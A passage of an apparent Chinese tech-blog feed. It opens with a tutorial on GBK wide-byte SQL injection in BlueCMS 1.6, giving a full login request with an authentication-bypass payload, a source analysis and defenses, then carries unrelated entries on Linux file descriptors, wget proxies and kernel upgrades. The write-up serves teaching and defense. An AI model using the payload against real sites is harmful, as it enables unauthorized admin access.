<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;bluecmsv1.6&#x2F;uploads&#x2F;admin&#x2F;login.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko&#x2F;20100101 Firefox&#x2F;49.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1&#x2F;bluecmsv1.6&#x2F;uploads&#x2F;admin&#x2F;login.php?act&#x3D;login</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 80</span><br><span class="line">​</span><br><span class="line">admin_name&#x3D;admin %df&#39; or 1&#x3D;1 -- &#39;&amp;admin_pwd&#x3D;11&amp;submit&#x3D;%B5%C7%C2%BC&amp;act&#x3D;do_login</span><br></pre></td></tr></table></figure>
<p>成功登录后台<br><img src="https://image.3001.net/images/20180316/15211811595369.png!small" alt="21"></p>
<h4 id="4-3-1-源码分析"><a href="#4-3-1-源码分析" class="headerlink" title="4.3.1 源码分析"></a>4.3.1 源码分析</h4><p>看下管理员登录界面的源码admin/login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">&#x27;IN_BLUE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">​</span><br><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/include/common.inc.php&#x27;</span>);</span><br><span class="line"><span class="variable">$act</span> = !<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;act&#x27;</span>]) ? trim(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;act&#x27;</span>]) : <span class="string">&#x27;login&#x27;</span>;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$act</span> == <span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>])&#123;</span><br><span class="line">       showmsg(<span class="string">&#x27;您已登录，不用再次登录&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   template_assign(<span class="string">&#x27;current_act&#x27;</span>, <span class="string">&#x27;登录&#x27;</span>);</span><br><span class="line">   <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;login.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>在第二行可以看到包含了/include/common.inc.php文件，跟进一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">&#x27;include/mysql.class.php&#x27;</span>);</span><br><span class="line">​</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysql(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="variable">$dbname</span>);</span><br></pre></td></tr></table></figure>

<p>第一行包含了include/mysql.class.php文件，第二行实例化mysql对象，继续跟进mysql.class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysql</span>(<span class="params"><span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpw</span>, <span class="variable">$dbname</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$dbcharset</span> = <span class="string">&#x27;gbk&#x27;</span>, <span class="variable">$connect</span>=<span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">empty</span>(<span class="variable">$connect</span>) ? <span class="string">&#x27;mysql_pconnect&#x27;</span> : <span class="string">&#x27;mysql_connect&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;linkid = @<span class="variable">$func</span>(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpw</span>, <span class="literal">true</span>))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;dbshow(<span class="string">&#x27;Can not connect to Mysql!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;dbversion() &gt; <span class="string">&#x27;4.1&#x27;</span>)&#123;</span><br><span class="line">                mysql_query( <span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;dbversion() &gt; <span class="string">&#x27;5.0.1&#x27;</span>)&#123;</span><br><span class="line">                    mysql_query(<span class="string">&quot;SET sql_mode = &#x27;&#x27;&quot;</span>,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>/include/common.inc.php文件中的mysql实例化对象，调用了这个mysql类，将数据库的连接信息进行封装，重点关注下mysql_query( “SET NAMES gbk”);这一句,使三个字符集（客户端、连接层、结果集）都是GBK编码，经过前面的讲解可以知道gbk是双字节，如果再使用了addslashes()等前面所说的函数进行转义操作，那么一定可以触发宽字节注入</p>
<p>回到common.inc.php,看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">   <span class="variable">$_POST</span> = deep_addslashes(<span class="variable">$_POST</span>);</span><br><span class="line">   <span class="variable">$_GET</span> = deep_addslashes(<span class="variable">$_GET</span>);</span><br><span class="line">   <span class="variable">$_COOKIES</span> = deep_addslashes(<span class="variable">$_COOKIES</span>);</span><br><span class="line">   <span class="variable">$_REQUEST</span> = deep_addslashes(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有开启get_magic_quotes_gpc(),则会对各种请求数据使deep_addslashes()进行过滤，跟进下这个函数，在common.fun.php文件中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep_addslashes</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array(<span class="variable">$str</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$str</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$key</span>] = deep_addslashes(<span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$str</span> = addslashes(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不管是数组还是字符串都会调用addslashes()函数进行字符的转义</p>
<p>至此可以确定能触发宽字节注入</p>
<h4 id="4-3-2-sql语句分析"><a href="#4-3-2-sql语句分析" class="headerlink" title="4.3.2 sql语句分析"></a>4.3.2 sql语句分析</h4><p>前面已经构造了payload，现在看一看完整的sql语句</p>
<p>admin/login.php源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(check_admin(<span class="variable">$admin_name</span>, <span class="variable">$admin_pwd</span>))&#123;</span><br><span class="line">        update_admin_info(<span class="variable">$admin_name</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$remember</span> == <span class="number">1</span>)&#123;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>前面已经构造了payload，现在看一看完整的sql语句</p>
<p>admin/login.php源码</p>
<p>check_admin()函数使用了输入的用户名和密码，跟进一下</p>
<p>该函数在include/common.fun.php文件中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_admin</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$pwd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.table(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$name</span>&#x27; and pwd = md5(&#x27;<span class="subst">$pwd</span>&#x27;)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;num&#x27;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>正常的sql语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> num <span class="keyword">FROM</span> blue_admin <span class="keyword">WHERE</span> admin_name<span class="operator">=</span><span class="string">&#x27;$name&#x27;</span> <span class="keyword">and</span> pwd <span class="operator">=</span> md5(<span class="string">&#x27;$pwd&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>当从blue_admin表中查到admin的信息，num的值就会大于零，这样就可以登录成功</p>
<p>含有payload的sql语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SELECT COUNT(*) <span class="keyword">AS</span> num <span class="keyword">FROM</span> blue_admin WHERE admin_name=<span class="string">&#x27;1 運&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> -- <span class="string">&#x27; and pwd = md5(&#x27;</span><span class="variable">$pwd</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
<p>登录后台管理，可以寻找上传点，或者利用已知的漏洞，从而getshell，进而控制整个服务器。</p>
<h2 id="5-防护手段"><a href="#5-防护手段" class="headerlink" title="5. 防护手段"></a>5. 防护手段</h2><p>使用mysql_set_charset(GBK)指定字符集</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET character_set_connection&#x3D;gbk, character_set_results&#x3D;gbk,character_set_client&#x3D;binary</span><br></pre></td></tr></table></figure>
<p>使用mysql_real_escape_string进行转义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集（使用mysql_set_charset指定字符集），不会出现前面的df和5c拼接为一个宽字节的问题</span><br></pre></td></tr></table></figure>
<p>以上两个条件需要同时满足才行，缺一不可。</p>
<p>————————————<br>本文作者：Setup， 转载请注明来自(FreeBuf.COM)[<a href="https://www.freebuf.com/]">https://www.freebuf.com/]</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>CTF</category>
        <category>Web 安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Web 安全</tag>
      </tags>
  </entry>
  <entry>
    <title>彻底弄懂 Linux 下的文件描述符（fd）</title>
    <url>/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/</url>
    <content><![CDATA[<p>Linux 下的文件描述符</p>
<span id="more"></span>

<h2 id="1-从一个最常见的例子说起"><a href="#1-从一个最常见的例子说起" class="headerlink" title="1. 从一个最常见的例子说起"></a>1. 从一个最常见的例子说起</h2><p>在使用Linux的过程中， 我们平时经常看到下面这样的用法：</p>
<blockquote>
<p>echo log &gt; /dev/null 2&gt;&amp;1</p>
</blockquote>
<ul>
<li><blockquote>
<p>  ：表示将输出结果重定向到哪里，例如：echo “123” &gt; /home/123.txt</p>
</blockquote>
</li>
<li>/dev/null ：表示空设备文件<br>所以 echo log &gt; /dev/null 表示把日志输出到空文件设备，也就是将打印信息丢弃掉，屏幕上什么也不显示。</li>
<li>1  ：表示stdout标准输出</li>
<li>2  ：表示stderr标准错误</li>
<li>&amp;  ：表示等同于的意思</li>
</ul>
<p>所以  2&gt;&amp;1 表示2的输出重定向等同于1，也就是标准错误输出重定向到标准输出。因为前面标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
<p>这个用法平时很常见，重点是为什么这里是用 2 和 1 ，不是3456什么的呢？这要从 Linux 中的文件描述符说起。</p>
<h2 id="2-Linux中的文件描述符（file-descriptor）"><a href="#2-Linux中的文件描述符（file-descriptor）" class="headerlink" title="2. Linux中的文件描述符（file descriptor）"></a>2. Linux中的文件描述符（file descriptor）</h2><p>我们知道在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。在操作这些所谓的文件的时候，我们每操作一次就找一次名字，这会耗费大量的时间和效率。所以Linux中规定每一个文件对应一个索引，这样要操作文件的时候，我们直接找到索引就可以对其进行操作了。</p>
<p>文件描述符（file descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4……</p>
<p>Linux内核对所有打开的文件有一个文件描述符表格，里面存储了每个文件描述符作为索引与一个打开文件相对应的关系，简单理解就是下图这样一个数组，文件描述符（索引）就是文件描述符表这个数组的下标，数组的内容就是指向一个个打开的文件的指针。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/linux/fd_file_descriptor.png" alt="file descriptor"></p>
<p><strong>上面只是简单理解，实际上关于文件描述符，Linux内核维护了3个数据结构：</strong></p>
<ul>
<li>进程级的文件描述符表</li>
<li>系统级的打开文件描述符表</li>
<li>文件系统的i-node表</li>
</ul>
<p>一个 Linux 进程启动后，会在内核空间中创建一个 PCB(Process Control Block) 控制块，PCB 内部有一个文件描述符表（File descriptor table），记录着当前进程所有可用的文件描述符，也即当前进程所有打开的文件。进程级的描述符表的每一条记录了单个进程所使用的文件描述符的相关信息，进程之间相互独立，一个进程使用了文件描述符3，另一个进程也可以用3。除了进程级的文件描述符表，系统还需要维护另外两张表：打开文件表、i-node 表。这两张表存储了每个打开文件的打开文件句柄（open file handle）。一个打开文件句柄存储了与一个打开文件相关的全部信息。</p>
<p><strong>系统级的打开文件描述符表：</strong></p>
<ul>
<li>当前文件偏移量（调用read()和write()时更新，或使用lseek()直接修改）</li>
<li>打开文件时的标识（open()的flags参数）</li>
<li>文件访问模式（如调用open()时所设置的只读模式、只写模式或读写模式）</li>
<li>与信号驱动相关的设置</li>
<li>对该文件i-node对象的引用，即i-node 表指针</li>
</ul>
<p><strong>文件系统的i-node表：</strong></p>
<ul>
<li><p>文件类型（例如：常规文件、套接字或FIFO）和访问权限</p>
</li>
<li><p>一个指针，指向该文件所持有的锁列表</p>
</li>
<li><p>文件的各种属性，包括文件大小以及与不同类型操作相关的时间戳</p>
</li>
<li><p>文件描述符、打开的文件句柄以及i-node之间的关系如下图：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/linux/fd_relationship.png" alt="relationship"></p>
</li>
<li><p>在进程 A 中，文件描述符 1 和 20 都指向了同一个打开文件表项，标号为 23（指向了打开文件表中下标为 23 的数组元素），这可能是通过调用 dup()、dup2()、fcntl() 或者对同一个文件多次调用了 open() 函数形成的。</p>
</li>
<li><p>进程 A 的文件描述符 2 和进程 B 的文件描述符 2 都指向了同一个文件，这可能是在调用 fork() 后出现的（即进程 A、B 是父子进程关系），或者是不同的进程独自去调用 open() 函数打开了同一个文件，此时进程内部的描述符正好分配到与其他进程打开该文件的描述符一样。</p>
</li>
<li><p>进程 A 的描述符 0 和进程 B 的描述符 3 分别指向不同的打开文件表项，但这些表项均指向 i-node 表的同一个条目（标号为 1976）；换言之，它们指向了同一个文件。发生这种情况是因为每个进程各自对同一个文件发起了 open() 调用。同一个进程两次打开同一个文件，也会发生类似情况。 </p>
</li>
</ul>
<p><strong>这就说明：同一个进程的不同文件描述符可以指向同一个文件；不同进程可以拥有相同的文件描述符；不同进程的同一个文件描述符可以指向不同的文件（一般也是这样，除了 0、1、2 这三个特殊的文件）；不同进程的不同文件描述符也可以指向同一个文件。</strong></p>
<h2 id="3-Linux上打开文件举例"><a href="#3-Linux上打开文件举例" class="headerlink" title="3. Linux上打开文件举例"></a>3. Linux上打开文件举例</h2><p>比如在Linux上用 vim test.py 打开一个文件，保持打开状态，再新打开一个新的shell，输入命令pidof vim 获取vim进程的pid号，然后 ll  /proc/$pid/fd 查看vim 进程所使用的文件描述符列表。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/linux/fd_example_vim.png" alt="example vim"></p>
<p>/dev/pts是远程登陆(telnet,ssh等)后创建的控制台设备文件所在的目录。因为我是通过Xshell远程登录的，所以标准输入0，标准输出1，标准错误2的文件描述符都指向虚拟终端控制台 /dev/pts/6 。再看下面是新打开的 test.py 的文件描述符，竟然是4，说好的从3开始呢？</p>
<p>这个我也困扰了好久，查了各种资料，终于在一个大佬的帮助下在一个论坛找到原因，有时候中文查不到还是要试试英文搜索啊。因为vim这种编辑器的原理是先打开源文件并拷贝，然后关闭源文件再打开自己的副本，修改完文件保存的时候直接将副本重命名覆盖源文件。所以打开源文件的时候用的文件描述符3，然后打开自己的副本是时候就该用文件描述符4了，然后关闭源文件，文件描述符3就被释放了，我们查看的时候就只剩下了4，这里它指向的是vim创建的副本文件。这里只是说个大概意思，具体深究要去深入了解一下<a href="https://blog.csdn.net/weixin_43535689/article/details/104750148">vim的实现原理——奥尔特星云大使</a>，下面是当时我看到的论坛上的资料截图，链接在这：<a href="https://stackoverflow.com/questions/48588284/lsof-command-can-not-return-files-being-opened-by-kwrite">StackOverFlow</a>。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/linux/fd_stackoverflow_vim.png" alt="stackoverflow vim"></p>
<h2 id="4-C语言中文件描述符的使用"><a href="#4-C语言中文件描述符的使用" class="headerlink" title="4. C语言中文件描述符的使用"></a>4. C语言中文件描述符的使用</h2><p>C语言中可以通过 open 函数返回一个文件的文件描述符，首先创建一个 test.py 文件用于打开，然后创建一个 test.c 文件，输入下面代码保存。 编译后执行，发现新打开文件的文件描述符是3。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;test.py&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;test.py fd = %d \n&quot;</span>, fd);  <span class="comment">// test.py fd = 3</span></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-Python中文件描述符的使用"><a href="#5-Python中文件描述符的使用" class="headerlink" title="5. Python中文件描述符的使用"></a>5. Python中文件描述符的使用</h2><p>Python中通过 sys 模块封装了标准输入、标准输出和错误输出。通过我们平时常用的内建函数 open 可以获取一个文件的文件描述符，首先创建一个 test.py 文件用于打开，然后创建一个 test2.py 文件，输入下面代码保存。 执行，发现新打开文件的文件描述符是3。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stdin fd = &#x27;</span>, sys.stdin.fileno())  // stdin fd = <span class="number">0</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stdout fd = &#x27;</span>, sys.stdout.fileno())  // stdout fd = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stderr fd = &#x27;</span>, sys.stderr.fileno())  // stderr fd = <span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.py&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test.py fd = &#x27;</span>, f.fileno())  // test.py fd = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<h2 id="6-Linux配置系统最大打开文件描述符个数"><a href="#6-Linux配置系统最大打开文件描述符个数" class="headerlink" title="6. Linux配置系统最大打开文件描述符个数"></a>6. Linux配置系统最大打开文件描述符个数</h2><h3 id="系统级限制"><a href="#系统级限制" class="headerlink" title="系统级限制"></a>系统级限制</h3><p>理论上系统内存有多少就可以打开多少的文件描述符，但是在实际中内核是会做相应的处理，一般最大打开文件数会是系统内存的10%（以KB来计算），称之为系统级限制。这个数字可以通过 cat /proc/sys/fs/file-max 或者 sysctl -a | grep fs.file-max 命令查看。</p>
<p>更改系统级限制有临时更改和永久更改两种方式：</p>
<ul>
<li>临时更改：session断开或者系统重启后会恢复原来的设置值。使用命令 sysctl -w fs.file-max=xxxx，其中xxxx就是要设置的数字。</li>
<li>永久更改：vim编辑 /etc/sysctl.conf 文件，在后面添加 fs.file-max=xxxx，其中xxxx就是要设置的数字。保存退出后还要使用sysctl -p 命令使其生效。</li>
</ul>
<h3 id="用户级限制"><a href="#用户级限制" class="headerlink" title="用户级限制"></a>用户级限制</h3><p>同时为了控制每个进程消耗的文件资源，内核也会对单个进程最大打开文件数做默认限制，即用户级限制。32位系统默认值一般是1024，64位系统默认值一般是65535，可以使用 ulimit -n 命令查看。</p>
<p>更改用户级限制也有临时更改和永久更改两种方式：</p>
<ul>
<li>临时更改：session断开或者系统重启后会恢复原来的设置值。使用命令 ulimit -SHn xxxx 命令来修改，其中xxxx就是要设置的数字。</li>
<li>永久更改：vim编辑 /etc/security/limits.conf 文件，修改其中的 hard nofile xxxx 和 soft nofile xxxx，其中xxxx就是要设置的数字。保存后退出。关于hard和soft的区别，参照下面参考链接中的第5个。</li>
</ul>
<h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7. 参考链接"></a>7. 参考链接</h2><ol>
<li><a href="https://blog.csdn.net/cywosp/article/details/38965239">每天进步一点点——Linux中的文件描述符与打开文件之间的关系——cywosp</a></li>
<li><a href="http://c.biancheng.net/view/3066.html">Linux文件描述符到底是什么？——C语言中文网</a></li>
<li><a href="https://www.jianshu.com/p/0ff9ff1d108e">句柄和文件描述符（FD）——阳光丶不锈</a></li>
<li><a href="https://juejin.cn/post/6844903962043236365#heading-0">带你破案：文件描述符到底是什么？——vran</a></li>
<li><a href="http://www.ideabuffer.cn/2016/11/20/Linux%E9%85%8D%E7%BD%AE%E8%B0%83%E4%BC%98%EF%BC%9A%E6%9C%80%E5%A4%A7%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%AA%E6%95%B0/">Linux配置调优：最大打开文件描述符个数——Idea Buffer</a></li>
<li><a href="%E4%BF%AE%E6%94%B9Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%9A%84%E6%9C%80%E5%A4%A7%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%99%90%E5%88%B6">修改Linux系统下的最大文件描述符限制——BlueguyChui</a></li>
</ol>
<p>————————————————<br>版权声明：本文为CSDN博主「杰克小麻雀」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/yushuaigee/article/details/107883964">https://blog.csdn.net/yushuaigee/article/details/107883964</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>如何配置 wget 代理</title>
    <url>/%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%20wget%20%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>在开了全局代理的情况下，wget 与 git 一样，也需要再配置代理</p>
<span id="more"></span>
<h2 id="方法一-参数设置"><a href="#方法一-参数设置" class="headerlink" title="方法一:参数设置"></a>方法一:参数设置</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -e http_proxy=127.0.0.1:1089 google.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--2020-03-01 11:53:55--  http://google.com/</span><br><span class="line"></span><br><span class="line">Connecting to 127.0.0.1:1089... connected.</span><br><span class="line"></span><br><span class="line">Proxy request sent, awaiting response... 301 Moved Permanently</span><br><span class="line"></span><br><span class="line">Location: http://www.google.com/ [following]</span><br><span class="line"></span><br><span class="line">--2020-03-01 11:53:57--  http://www.google.com/</span><br><span class="line"></span><br><span class="line">Reusing existing connection to 127.0.0.1:1089.</span><br><span class="line"></span><br><span class="line">Proxy request sent, awaiting response... 200 OK</span><br><span class="line"></span><br><span class="line">Length: unspecified [text/html]</span><br><span class="line"></span><br><span class="line">Saving to: ‘index.html’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index.html                               [ &lt;=&gt;                                                                 ]  12.56K  --.-KB/s    in 0s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2020-03-01 11:54:01 (160 MB/s) - ‘index.html’ saved [12863]</span><br></pre></td></tr></table></figure>

<h2 id="方法二-配置文件设置"><a href="#方法二-配置文件设置" class="headerlink" title="方法二:配置文件设置"></a>方法二:配置文件设置</h2><p>进入目录</p>
<blockquote>
<p>cd ~</p>
</blockquote>
<p>创建.wgetrc配置文件</p>
<blockquote>
<p>n vim .wgetrc</p>
</blockquote>
<p>设置代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http_proxy &#x3D; http:&#x2F;&#x2F;your_proxy:port</span><br><span class="line"></span><br><span class="line">https_proxy &#x3D; http:&#x2F;&#x2F;your_proxy:port</span><br><span class="line"></span><br><span class="line">proxy_user &#x3D; user</span><br><span class="line"></span><br><span class="line">proxy_password &#x3D; password</span><br><span class="line"></span><br><span class="line">use_proxy &#x3D; on</span><br><span class="line"></span><br><span class="line">wait &#x3D; 15</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>工具</category>
        <category>proxy</category>
      </categories>
      <tags>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>解决 AMD 在 ubuntu 上无法外接显示器问题</title>
    <url>/%E8%A7%A3%E5%86%B3%20ubuntu%20%E6%97%A0%E6%B3%95%E5%A4%96%E7%95%8C%E6%98%BE%E7%A4%BA%E5%99%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>实际上 ubuntu 的内核（5.4及以下）还不支持 AMD 4000 系列的集显，所以无法驱动。</p>
<p>解决办法是更新 ubuntu 内核版本</p>
<span id="more"></span>

<p>更新前最好用 timeshift 备份系统</p>
<p>matebook14 2020 锐龙版 4600H CPU 实测 v5.7 内核能支持。</p>
<p>v5.7：<a href="https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.7/"></a><a href="https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.7/">https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.7/</a></p>
<p>升级方法：</p>
<ol>
<li>下载内核包(共四个)<br>第一个：linux-headers_***all.deb<br>其余三个：分三类（headers、module、image）全选择 generic 或者 lowlatency 下载。</li>
<li><code>sudo dpkg -i </code>依次安装<br>我的安装顺序：all -&gt; headers -&gt; module -&gt; image。</li>
<li>重启电脑，输入命令<code>uname -a</code> 查看是否升级成功 </li>
</ol>
<p><strong>参考</strong></p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/149564937">联想小新Pro13 2020锐龙版R7 4800U安装ubuntu-20.04</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网路：自顶向下方法</title>
    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF_%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/</url>
